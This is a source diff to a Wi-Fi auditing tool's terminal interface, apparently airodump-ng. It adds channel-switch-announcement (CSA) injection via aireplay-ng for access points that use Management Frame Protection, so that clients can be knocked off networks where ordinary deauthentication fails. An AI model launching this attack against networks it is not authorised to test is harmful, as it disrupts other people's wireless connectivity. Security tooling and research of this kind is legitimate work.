@@ -732,6 +732,7 @@ static int ap_security_auth_rank(unsigned int security);
 static int ap_station_count_rank(const struct AP_info * ap);
 static int ap_essid_compare(const struct AP_info * lhs, const struct AP_info * rhs);
 static int ap_band_mode(const struct AP_info * ap);
+static int csa_channel_for_ap(const struct AP_info * ap);
 static int ensure_band_mode(int band_mode);
 static void set_channel_entry_prompt(void);
 static int set_kernel_regdom(const char * country);
@@ -1239,8 +1240,11 @@ static int launch_deauth(void)
 	int new_channel;
 	int new_frequency;
 	int ap_band_mode_value;
+	int csa_channel = 0;
 	int status;
 	int launched_any = 0;
+	int csa_launched = 0;
+	int use_csa;
 
 	if (lopt.p_selected_ap == NULL)
 	{
@@ -1253,6 +1257,19 @@ static int launch_deauth(void)
 
 	ap_cur = lopt.p_selected_ap;
 	format_mac(apmac, sizeof(apmac), ap_cur->bssid);
+	use_csa = ap_cur->mfp_required || ap_cur->mfp_capable;
+	if (use_csa)
+	{
+		csa_channel = csa_channel_for_ap(ap_cur);
+		if (csa_channel <= 0)
+		{
+			snprintf(lopt.message,
+					 sizeof(lopt.message),
+					 "][ unable to select a CSA channel for the AP band");
+			append_tui_message_history_now(lopt.message);
+			return (0);
+		}
+	}
 
 	if (deauth_is_unassociated_ap(ap_cur))
 	{
@@ -1379,13 +1396,22 @@ static int launch_deauth(void)
 		goto restore_state;
 	}
 
-	snprintf(lopt.message,
-			 sizeof(lopt.message),
-			 "][ running aireplay-ng for %d station%s",
-			 station_count,
-			 (station_count == 1) ? "" : "s");
+	if (use_csa)
+	{
+		snprintf(lopt.message,
+					 sizeof(lopt.message),
+					 "][ running CSA injection on channel %d",
+					 csa_channel);
+	}
+	else
+	{
+		snprintf(lopt.message,
+					 sizeof(lopt.message),
+					 "][ running aireplay-ng for %d station%s",
+					 station_count,
+					 (station_count == 1) ? "" : "s");
+	}
 	append_tui_message_history_now(lopt.message);
-	launched_any = 1;
 
 	st_cur = lopt.st_1st;
 	while (st_cur != NULL)
@@ -1394,12 +1420,27 @@ static int launch_deauth(void)
 		{
 			int pipefd[2];
 			pid_t child_pid;
+			char csa_channel_arg[4];
+
+			if (use_csa && csa_launched) break;
+			csa_launched = use_csa;
+			launched_any = 1;
 
 			format_mac(stmac, sizeof(stmac), st_cur->stmac);
-			snprintf(lopt.message,
-					 sizeof(lopt.message),
-					 "][ aireplay-ng %s",
-					 stmac);
+			if (use_csa)
+			{
+				snprintf(lopt.message,
+						 sizeof(lopt.message),
+						 "][ aireplay-ng --csa %d",
+						 csa_channel);
+			}
+			else
+			{
+				snprintf(lopt.message,
+						 sizeof(lopt.message),
+						 "][ aireplay-ng %s",
+						 stmac);
+			}
 			append_tui_message_history_now(lopt.message);
 
 			if (pipe(pipefd) < 0)
@@ -1428,6 +1469,10 @@ static int launch_deauth(void)
 			if (child_pid == 0)
 			{
 				int null_fd;
+				snprintf(csa_channel_arg,
+						 sizeof(csa_channel_arg),
+						 "%d",
+						 csa_channel);
 
 				setsid();
 				close(pipefd[0]);
@@ -1448,6 +1493,20 @@ static int launch_deauth(void)
 					_exit(127);
 				}
 				close(pipefd[1]);
+				if (use_csa)
+				{
+					execlp("aireplay-ng",
+						   "aireplay-ng",
+						   "--csa",
+						   "5",
+						   "--csa-channel",
+						   csa_channel_arg,
+						   "-a",
+						   apmac,
+						   wlan_if,
+						   (char *) NULL);
+				}
+
 				execlp("aireplay-ng",
 					   "aireplay-ng",
 					   "-0",
@@ -5928,6 +5987,30 @@ static int ap_band_mode(const struct AP_info * ap)
 	}
 }
 
+static int csa_channel_for_ap(const struct AP_info * ap)
+{
+	int band_mode;
+
+	if (ap == NULL) return (0);
+
+	switch (ap->band)
+	{
+		case 24:
+			return (ap->channel == 14 ? 13 : 14);
+		case 5:
+			return (ap->channel == 165 ? 36 : 165);
+		case 6:
+			return (ap->channel == 233 ? 5 : 233);
+		default:
+			break;
+	}
+
+	band_mode = ap_band_mode(ap);
+	if (band_mode == BAND_MODE_A) return (165);
+	if (band_mode == BAND_MODE_AX) return (233);
+	return (14);
+}
+
 static int ensure_band_mode(int band_mode)
 {
 	int i;
@@ -6126,7 +6209,7 @@ static int deauth_mfp_guard(struct AP_info * ap_cur)
 		ap_cur->mfp_warned = 1;
 		snprintf(lopt.message,
 				 sizeof(lopt.message),
-				 "][ Selected AP requires MFP; press d again to continue");
+				 "][ Selected AP requires MFP; press d again to use CSA injection");
 		append_tui_message_history_now(lopt.message);
 		return (1);
 	}
@@ -6136,7 +6219,7 @@ static int deauth_mfp_guard(struct AP_info * ap_cur)
 		ap_cur->mfp_warned = 1;
 		snprintf(lopt.message,
 				 sizeof(lopt.message),
-				 "][ Selected AP advertises optional MFP; deauth may fail");
+				 "][ Selected AP advertises optional MFP; press d again to use CSA injection");
 		append_tui_message_history_now(lopt.message);
 		return (1);
 	}
